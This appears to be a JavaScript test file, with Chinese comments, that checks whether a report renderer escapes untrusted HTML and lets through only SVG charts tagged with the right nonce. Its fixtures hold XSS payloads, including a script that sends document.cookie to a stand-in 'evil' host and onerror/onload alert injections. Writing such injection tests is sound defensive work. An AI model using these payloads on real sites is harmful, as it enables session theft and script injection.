// tests/report-html.test.mjs
// 报告 Markdown → HTML 渲染（server/report-html.mjs）：可信图表穿透只认「本次 nonce 标记的
// chart-svg 围栏」，普通代码/正文仍转义（不可被注入脚本），并核验内联 CSP <meta>。
import assert from "node:assert/strict";
import test from "node:test";

import { renderReportHtml } from "../server/report-html.mjs";

const NONCE = "abc123nonce";

test("nonce 标记的 chart-svg 围栏：内容原样内联（不转义），普通代码/正文仍转义", () => {
  const md = [
    "# 标题",
    "",
    "```chart-svg:" + NONCE,
    '<div style="background:#000"><svg><text>hi</text></svg></div>',
    "```",
    "",
    "```",
    "<script>bad()</script>",
    "```",
    "",
    "正文含 <b>标签</b> 应被转义。",
  ].join("\n");
  const html = renderReportHtml(md, "t", { chartNonce: NONCE });
  // 可信 SVG 原样内联
  assert.ok(html.includes("<svg><text>hi</text></svg>"), "chart-svg 应原样内联");
  assert.ok(html.includes('<div style="background:#000">'), "chart-svg 容器 div 原样保留");
  // 普通代码块仍转义（防注入）
  assert.ok(html.includes("&lt;script&gt;"), "普通代码块里的 <script> 应被转义");
  assert.ok(!html.includes("<script>bad()</script>"), "绝不能原样输出脚本");
  // 普通正文里的 HTML 也被转义
  assert.ok(html.includes("&lt;b&gt;标签&lt;/b&gt;"), "正文 HTML 应被转义");
  // 基本结构
  assert.ok(html.includes("<h1>标题</h1>"));
});

test("未终止的 chart-svg 围栏不抛、不吐残标签", () => {
  const md = "# t\n\n```chart-svg:" + NONCE + "\n<svg></svg>\n"; // 少了收口 ```
  assert.doesNotThrow(() => renderReportHtml(md, "t", { chartNonce: NONCE }));
});

test("回归：不可信正文伪造 ```svg / ```chart-svg（无 nonce）→ 内容被转义、不产生 <script>/<svg>", () => {
  // 模拟被测上游模型回复经 AI 辅助分析原文进入报告；saveAiAnalysisReport 不传 nonce。
  const forged = [
    "# AI 辅助分析",
    "",
    "```svg",
    "<script>fetch('https://evil/'+document.cookie)</script>",
    "```",
    "",
    "```chart-svg",
    "<img src=x onerror=alert(1)>",
    "```",
    "",
    "```chart-svg:wrongnonce",
    "<svg onload=alert(2)></svg>",
    "```",
  ].join("\n");
  const html = renderReportHtml(forged, "t"); // 不传 chartNonce（等价 AI 辅助分析路径）
  assert.ok(!html.includes("<script>"), "伪造 ```svg 不得原样输出 <script>");
  assert.ok(!html.includes("<img src=x onerror"), "伪造 ```chart-svg 不得原样输出 <img onerror>");
  assert.ok(!html.includes("<svg onload"), "nonce 不符的围栏不得穿透");
  assert.ok(html.includes("&lt;script&gt;"), "伪造内容应作为代码块被转义");
  assert.ok(html.includes("&lt;img"), "伪造 <img> 应被转义");
});

test("回归：nonce 不匹配的 chart-svg 围栏一律转义（防重放/猜测）", () => {
  const md = "```chart-svg:" + NONCE + "\n<svg id='real'></svg>\n```";
  const html = renderReportHtml(md, "t", { chartNonce: "different" });
  assert.ok(!html.includes("<svg id='real'></svg>"), "nonce 不符不得穿透");
  assert.ok(html.includes("&lt;svg id=&#39;real&#39;&gt;") || html.includes("&lt;svg"), "应被转义");
});

test("生成的报告 HTML 头含内联 CSP <meta>（堵 file:// 直开的脚本执行）", () => {
  const html = renderReportHtml("# t\n\n正文", "t");
  assert.match(html, /<meta http-equiv="Content-Security-Policy"[^>]*default-src 'none'/);
  assert.match(html, /style-src 'unsafe-inline'/);
});
